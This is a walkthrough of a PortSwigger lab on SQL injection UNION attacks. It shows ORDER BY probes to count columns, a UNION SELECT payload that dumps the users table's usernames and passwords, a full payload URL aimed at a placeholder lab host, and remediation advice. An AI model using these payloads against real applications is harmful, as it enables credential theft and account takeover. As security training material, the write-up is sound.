# Lab 05 — SQL injection UNION attack, retrieving data from other tables

| | |
|---|---|
| **Difficulty** | 🟨 Practitioner |
| **Category** | UNION attacks |
| **Concept** | [07 — UNION attacks](https://portswigger.net/web-security/sql-injection) |
| **PortSwigger** | https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables |

---

## 🎯 Objective
The query returns two columns. There is a `users` table with `username` and `password` columns. Exfiltrate the credentials and **log in as `administrator`**.

## 🧠 Background
Once you know the column count and that columns accept text, a `UNION SELECT` from another table drops that table's data straight into the visible response.

## 🪜 Methodology
1. Confirm column count = **2** (both accept text):
   ```
   ?category=Gifts' ORDER BY 2--        (ok)
   ?category=Gifts' ORDER BY 3--        (error → 2 columns)
   ?category=Gifts' UNION SELECT 'a','b'--   (both render → both text)
   ```
2. Pull usernames and passwords into the two columns:
   ```
   ?category=Gifts' UNION SELECT username, password FROM users--
   ```
3. Read the `administrator` password from the rendered table.
4. Log in as `administrator` with that password.

## 💥 Payload
```
https://LAB-ID.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+username,+password+FROM+users--
```

## ✅ Why it works
The injected `SELECT username, password FROM users` matches the original query's 2-column shape, so its rows are unioned into the product listing and rendered — leaking the entire `users` table.

## 🛡️ Remediation
Parameterize queries and apply **least privilege** so the web app's DB user can't read the `users`/credentials table if it doesn't need to. See [16 — Prevention](https://portswigger.net/web-security/sql-injection).

## 🔑 Takeaway
Step 3 of UNION: with shape + text column known, any table in reach is readable. `#sqli` `#practitioner` `#union` `#data-exfil`
